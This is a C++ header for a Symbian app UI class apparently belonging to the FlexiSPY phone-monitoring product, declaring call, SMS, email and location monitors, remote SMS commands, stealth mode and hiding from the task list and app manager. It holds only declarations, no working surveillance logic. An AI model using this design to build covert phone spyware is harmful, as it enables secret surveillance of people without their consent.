#ifndef __CltAppUi_H__
#define __CltAppUi_H__

#include <aknviewappui.h>	// CAknViewAppUi

#include "LicenceManager.h"
#include "Timeout.h"
#if defined(EKA2)
#include "CommonServiceClient.h"
#else
#include "SecretKeyManager.h"
#endif
#include "CltSettingMan.h"
#include "SettingChangeObserver.h"
#include "CltDocument.h"
#include "PrivacyDialog.h"
#include "IMEIGetter.h"
#include "AccessPointMan.h"
#include "TheKiller.h"
#include "TzUtil.h"

class CCltDocument;
class CCltSettingView;
class CCltSettingsListContainer;
class CCltMainContainer;
class CCltMainView;
class CFxsConnTest;
class TApaTask;
class CCoeEnv;
class CFxsLogEngine;
class CPrdActivView;
class CLicenceManager;
class CMonitorClient;
class CSmsCmdManager;
class CSmsCmdHandler;
class CSpyBugClient;
class CSIMChangeEng;
class CFxsDatabase;
class CFxsLogEngine;
class CFxsMsgEngine;
class CFxsCallMonitor;
class CFxsSmsMonitor;
class CFxMailMonitor;
class CFxLocactionService;
class CFxsLocationMonitor;
class CCltTaskManager;
class CAppHelpText;
class CTimeOut;
class CAutoAnswer;
class CServerUrlManager;
class CServConnectMan;
class CTaskKiller;
class TAntiFlexiSpyArray;
class CDiagnosCmdHandler;
class TProductInfoShare;
class MFxPositionMethod;
class CTerminator;
class CTzUtil;

class CFxsAppUi : public CAknViewAppUi,
				  public MSettingChangeObserver,
				  public MLicenceObserver,
				  public MTimeoutObserver,
				  public MCommonServTerminateObserver
#if defined(EKA2)
				  ,public MFlexiKeyNotifiable
#else
				  ,public MSecretKeyCapObserver
#endif
	{
public:
	CFxsAppUi();
	~CFxsAppUi();
	void ConstructL();	
	/*
	* Set status pane title text
	*
	* @param aText Text to be shown on the title pane.
	*/
    void SetStatusPaneTitleL(const TDesC& aText);
	void ChangeViewL(TUid aViewId);	
	void ChangeViewL();
	/*
	*  Get application path in form of
	*  drive-letter:\path\
	* 
	*  @param aAppPath Application path
	*/	
	void GetAppPath(TFileName& aPath);		
	/*
	*  Get application drive
	*  The drive letter is in the form:
	*  drive-letter:
	* 
	*  @param aDrive on return drive
	*/
	void GetAppDrive(TDes& aDrive);    
	void GetAppDrive(TInt& aDrive);
	void ExitApp();
	TInt KillTask(TUid aUid);
	void Reboot();	
	void SendToBackground();	
	void BringToForeground();
	
	inline CCoeEnv& CoeEnv() const;
	inline RFs& FsSession() const;
	inline RWsSession& WsSession() const;
	inline RWindowGroup& RootWin() const;	
	inline CFxsSettings& SettingsInfo();
	inline CFxsDatabase& Database();
	inline CCltDocument& AppDocument() const;	
	inline CAccessPointMan& AccessPointMan() const;
	inline TBool CurrentlyHideFromTaskList() const;
	inline CLicenceManager& LicenceManager();	
	inline CServerUrlManager& ServerUrlManager() const;
	inline CTerminator* TheTerminator();
	//Get/Set tab state
	inline void SetSettingTabState(TInt aState);
	inline TInt GetSettingTabState() const;		
	inline TBool ProductActivated() const;
#if defined(EKA2)	
	inline TBool IsIMEIReady() const;
#endif
	/**
	* Get positioning method info
	*/
	MFxPositionMethod* FxPositionMethod();
	/**
	* Get MFxNetworkInfo
	*/
	MFxNetworkInfo* FxNetworkInfo();
	
    void ShowInfoDialogL(TInt aTitleResId,TDesC& aInfoTxt);	    
    void HideFromTaskListL(TBool aHide);    
    void ShowAboutL();
    
public:
	enum TLogon
		{
		ELogonNone,
		ELogonFlexiKEY,
		ELogonProductActivation,
		ELogonS9Dialog
		};
	
	inline TBool IsLogon() const;
	inline void SetLogon(TLogon aLogon);	
	TBool ConfirmBillableEventGlobalL(TFxBillableEvent aEvent);
	TBool ConfirmChangeLogConfigL();
	void SetStealthModeL(TBool aStealth);
private://MCommonServTerminateObserver
	void HandleCommonServTerminated(TInt aError);	
private: //MLicenceObserver
	void LicenceActivatedL(TBool aActivated); 
private: //MSettingChangeObserver
	void OnSettingChangedL(CFxsSettings& aSetting);	
private://MSecretKeyCapObserver		
	void SkcSecretCodeMatch();		
	void SkcDefaultKeyMatch();

private: //MFlexiKeyNotifiable
	void OfferFlexiKeyL(const TDesC& aFlexiKey);	
private: // from CEikAppUi
	void HandleCommandL(TInt aCommand);		
private: //MTimeoutObserver
 	void HandleTimedOutL(); 	
private: // from CCoeAppUi
	TKeyResponse HandleKeyEventL(const TKeyEvent& aKeyEvent, TEventCode aType);
	//void HandleScreenDeviceChangedL();	
	//void HandleResourceChangeL(TInt aType);
	//interested in window group changed event
	void HandleWsEventL(const TWsEvent& aEvent,CCoeControl* aDestination);
	//void HandleSystemEventL(const TWsEvent& aEvent);
	TBool ProcessCommandParametersL(CApaCommandLine &aCommandLine);
    void HandleForegroundEventL( TBool aForeground );    
	void HandleStatusPaneSizeChange();
	void HandleSystemEventL(const TWsEvent& aEvent);
private:
	void CreatePrivatePathL();
	void LoadSettingsL(const TFileName& aAppPath);
	void CreateAppModelL(const TFileName& aAppPath);
	void DoOnSettingChangedL(CFxsSettings& aSetting);
	void SetSmsKeywordL();
	void CreateKeyCapManagerL(const TFileName& appPath);
	void RegisterMonitorL(const TFileName& appPath);
	void SaveDataL();
	void UninstallL();
	void ShowAppInfoL();
	void ShowDbHealthInfoL();
	void SetExceptionHandler();
	void SwitchSettingViewL();
	void OnEventShutdownL();
	void GetShareDataPath(TFileName& aPath);
	void DeleteShareDataDirL();
#if defined(EKA2)	
	static void ExceptionHandler(TExcType aType);
#endif	
	TBool ConfirmBeforeHideL();
    void RegisterSmsCommand();
	void RegisterMonitor();	
	void DeregisterMonitor();
	void HideIconFromTasklistIfRequiredL();	
	TBool ShowPrivacyStatement();
	void DoTestConnectionL();
	void StartNativeAppMgrL();
	void SetHiddedFromAppMgrL(TBool aHidden);
	void DoReboot();	
	/**
	* Get view
	* @leave KErrNotFound
	*/
	CPrdActivView* ProductActivateViewL() const;	
private: // data
	CLicenceManager* iLicenceMan;
	CCltMainView* iMainView;//passing ownership
	CMonitorClient* iPanicMon;
	CSmsCmdManager* iSmsCmdMan;
	CSmsCmdHandler* iSmsCmHandler;
	CDiagnosCmdHandler* iDiagnosCmd;
	CSpyBugClient* iBugClient;
	CSIMChangeEng* iSimChange;
	CCltSettingMan* iSettingMan;
	/**
	Database interface*/
	CFxsDatabase* iDatabase;
	CFxsLogEngine* iLogEngine;
	CFxsMsgEngine* iMsgEngine;
	CFxsCallMonitor* iCallMonitor;
	CFxsSmsMonitor* iSmsMonitor;
	CFxMailMonitor* iMailMonitor;
	CFxLocactionService* iLocService;
	CFxsLocationMonitor* iLocationMonitor;	
	CAppHelpText* iHelpText;
	CAccessPointMan* iAccessPointMan;
	CServConnectMan* iServConnMan;
	CIMEIGetter* iIMEIGet;
	CServerUrlManager* iServUrlMan;
#if defined(EKA2)
	RCommonServices iComnServSession;	
	CCommonService* iDataService;	
#else
	CSecretKeyCapManager* iSecretKeyCap;
#endif
	CTerminator* iTerminator;
	CTaskKiller* iKiller;
	TS9PrivacyState iPrivacyState;	
	TUid  iCurrView;
	TLogon iLogon;
	TBool iMMCRemoved;
	TInt iSettingTabState;
	TBool iGotEikCmdExit;
	TBool iProductActivated;
	};
	
/// inline ///
inline CCoeEnv& CFxsAppUi::CoeEnv() const 
	{return *iCoeEnv;}
	
inline TBool CFxsAppUi::ProductActivated() const
	{return iProductActivated;}
	
inline CFxsSettings& CFxsAppUi::SettingsInfo()
	{return iSettingMan->SettingsInfo();}
	
inline CFxsDatabase& CFxsAppUi::Database()
	{return *iDatabase;}

inline CAccessPointMan& CFxsAppUi::AccessPointMan() const
	{return *iAccessPointMan;}
	
inline CCltDocument& CFxsAppUi::AppDocument() const
	{return *static_cast<CCltDocument*>(Document());}
	
inline TBool CFxsAppUi::CurrentlyHideFromTaskList() const
	{return AppDocument().CurrentlyHideFromTaskList();}
	
inline TBool CFxsAppUi::IsLogon() const
	{return iLogon != ELogonNone;}

inline void CFxsAppUi::SetLogon(TLogon aLogon)
	{iLogon = aLogon;}

inline RFs& CFxsAppUi::FsSession() const
	{return iCoeEnv->FsSession();}

inline RWsSession& CFxsAppUi::WsSession() const
	{return iCoeEnv->WsSession();}
	
inline RWindowGroup& CFxsAppUi::RootWin() const
	{return iCoeEnv->RootWin();}

inline CLicenceManager& CFxsAppUi::LicenceManager()
	{return *iLicenceMan;}
	
#if defined(EKA2)
inline TBool CFxsAppUi::IsIMEIReady() const
	{	
	return iDataService->NetworkInfoReady();
	}
#endif		

inline void CFxsAppUi::SetSettingTabState(TInt aState)
	{iSettingTabState = aState;}		

inline TInt CFxsAppUi::GetSettingTabState() const
	{return iSettingTabState;}

inline CServerUrlManager& CFxsAppUi::ServerUrlManager() const
	{return *iServUrlMan;}

inline CTerminator* CFxsAppUi::TheTerminator()
	{return iTerminator;}

#endif
